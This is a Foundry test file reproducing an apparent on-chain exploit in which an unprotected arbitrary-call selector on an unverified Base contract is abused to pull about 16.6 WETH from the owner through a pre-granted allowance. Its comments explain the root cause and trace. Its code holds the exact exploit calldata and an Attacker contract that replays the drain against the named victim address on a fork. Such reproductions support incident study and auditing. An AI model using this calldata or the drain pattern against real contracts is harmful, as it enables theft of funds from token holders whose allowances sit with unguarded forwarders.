// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// UnprotectedArbBot — unprotected arbitrary-call forwarder drained via a pre-granted WETH allowance
// ~16.623 WETH (~$31.7K at $1904.74/WETH) pulled from an owner EOA on Base in a single tx.
//
// Exploit tx : 0xe831f3991132cbaffbb4a3738da7d1e254a6c02f0adce605a333229a61e27ad7 (block 49304016)
//   Contract-creation tx: the attacker EOA deploys an orchestrator (0x45e7...15cC) whose
//   constructor deploys a helper (0x797c...6dc8) and immediately drives the drain. The helper
//   makes ONE call to the victim's unprotected selector 0x42be3129.
//
// Root cause (reproduced observable behavior — victim is UNVERIFIED, names are apparent only):
//   The victim contract 0xa317...c170 exposes selector 0x42be3129 with NO access control. It
//   takes a caller-supplied target + calldata, executes it via a low-level CALL, then sweeps the
//   named token balance to msg.sender. A separate selector (0x23a69e75) IS onlyOwner-gated
//   (its handler reverts "not owner" on `msg.sender != owner`), but 0x42be3129 is not gated at
//   all. The attacker abused this to make the victim call
//     WETH.transferFrom(owner, victim, 16.623 WETH)
//   using an allowance the owner had PRE-GRANTED the victim, then the same 0x42be3129 call swept
//   that WETH out to the caller (the helper), which forwarded it to the attacker EOA.
//
//   Confirmed attacker-controlled + on-chain: no signature, no privileged role, no compromised
//   key, no upstream privilege upgrade. The victim call in the trace has msg.sender = the
//   attacker-deployed helper (not the owner), and the tx is a plain contract creation from the
//   attacker EOA. The only pre-existing state relied upon is the owner's ERC20 allowance to the
//   victim, which is standard on-chain state, not a privilege.
//
// Observed on-chain (drpc callTracer + receipt logs), single 0x42be3129 call:
//   1. victim -> WETH.transferFrom(helper, WETH, 0)                 (incidental, amount 0)
//   2. victim -> WETH.transferFrom(owner, victim, 16.623 WETH)      (the arbitrary forwarded call)
//   3. victim -> WETH.transfer(helper, 16.623 WETH)                 (sweep to caller)
//   then helper -> WETH.transfer(attacker, 16.623 WETH)             (forward to attacker EOA)
//
// Victim (unverified) : 0xA31722CA2a32695280d0E7e325b3dd6d699Fc170
// Owner EOA (drained) : 0x386218744a2053D949a1cafAE0b7B49a35e03F53
// Attacker EOA        : 0xBDCe6BDd52bacEaDd1fC91BF01F3bc6AB24df17A
// WETH (Base)         : 0x4200000000000000000000000000000000000006
//
// Run:
//   forge test --contracts src/test/2026-07/UnprotectedArbBot_exp.sol -vvv

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract UnprotectedArbBotExp is Test {
    address constant VICTIM = 0xA31722CA2a32695280d0E7e325b3dd6d699Fc170;
    address constant OWNER = 0x386218744a2053D949a1cafAE0b7B49a35e03F53;
    address constant ATTACKER = 0xBDCe6BDd52bacEaDd1fC91BF01F3bc6AB24df17A;
    address constant WETH = 0x4200000000000000000000000000000000000006;

    // Fork at block-1: the exploit is a single self-contained tx, no same-block setup.
    uint256 constant FORK_BLOCK = 49_304_015;

    // Exact original calldata sent to the victim's unprotected selector 0x42be3129:
    //   0x42be3129(WETH, 0, WETH, 16.623e18, WETH, transferFrom(owner, victim, 16.623e18))
    // The trailing bytes arg is the arbitrary payload the victim executes via low-level CALL:
    //   WETH.transferFrom(0x386218...03f53, 0xA31722...c170, 0xe6b0dd827241bb50)
    bytes constant EXPLOIT_CALLDATA =
        hex"42be3129000000000000000000000000420000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000000000000000000000000000004200000000000000000000000000000000000006000000000000000000000000000000000000000000000000e6b0dd827241bb50000000000000000000000000420000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000006423b872dd000000000000000000000000386218744a2053d949a1cafae0b7b49a35e03f53000000000000000000000000a31722ca2a32695280d0e7e325b3dd6d699fc170000000000000000000000000000000000000000000000000e6b0dd827241bb5000000000000000000000000000000000000000000000000000000000";

    IERC20 weth = IERC20(WETH);

    function setUp() public {
        vm.createSelectFork("base", FORK_BLOCK);
        vm.label(VICTIM, "Victim");
        vm.label(OWNER, "Owner");
        vm.label(ATTACKER, "Attacker");
        vm.label(WETH, "WETH");
    }

    function testExploit() public {
        // Precondition the attack relies on: owner pre-granted the victim a WETH allowance.
        // This is ordinary on-chain state, not a privilege the attacker holds.
        uint256 allowance = weth.allowance(OWNER, VICTIM);
        assertGt(allowance, 0, "owner has no pre-granted allowance to victim");
        emit log_named_decimal_uint("owner->victim WETH allowance", allowance, 18);

        uint256 attackerBefore = weth.balanceOf(ATTACKER);
        emit log_named_decimal_uint("attacker WETH before", attackerBefore, 18);

        // Deploy the attacker helper and drive the drain, pranking the attacker EOA as
        // tx.origin (and the helper as msg.sender to the victim, matching the real trace).
        vm.startPrank(ATTACKER, ATTACKER);
        Attacker helper = new Attacker();
        helper.run();
        vm.stopPrank();

        uint256 attackerAfter = weth.balanceOf(ATTACKER);
        emit log_named_decimal_uint("attacker WETH after", attackerAfter, 18);

        uint256 gain = attackerAfter - attackerBefore;
        emit log_named_decimal_uint("attacker WETH gain", gain, 18);

        // Assert the net attacker WETH gain matches the incident-reported loss (~16.623 WETH).
        assertApproxEqAbs(gain, 16.623029776956898128 ether, 0.001 ether, "unexpected drain amount");
    }
}

// Minimal stand-in for the attacker helper (0x797c...6dc8). Replays the exact 0x42be3129
// calldata against the victim, receives the swept WETH, and forwards it to the attacker EOA —
// exactly as the on-chain helper did.
contract Attacker is Test {
    address constant VICTIM = 0xA31722CA2a32695280d0E7e325b3dd6d699Fc170;
    address constant ATTACKER = 0xBDCe6BDd52bacEaDd1fC91BF01F3bc6AB24df17A;
    address constant WETH = 0x4200000000000000000000000000000000000006;

    bytes constant EXPLOIT_CALLDATA =
        hex"42be3129000000000000000000000000420000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000000000000000000000000000004200000000000000000000000000000000000006000000000000000000000000000000000000000000000000e6b0dd827241bb50000000000000000000000000420000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000006423b872dd000000000000000000000000386218744a2053d949a1cafae0b7b49a35e03f53000000000000000000000000a31722ca2a32695280d0e7e325b3dd6d699fc170000000000000000000000000000000000000000000000000e6b0dd827241bb5000000000000000000000000000000000000000000000000000000000";

    function run() external {
        (bool ok,) = VICTIM.call(EXPLOIT_CALLDATA);
        require(ok, "42be3129 call failed");
        uint256 bal = IERC20(WETH).balanceOf(address(this));
        IERC20(WETH).transfer(ATTACKER, bal);
    }
}
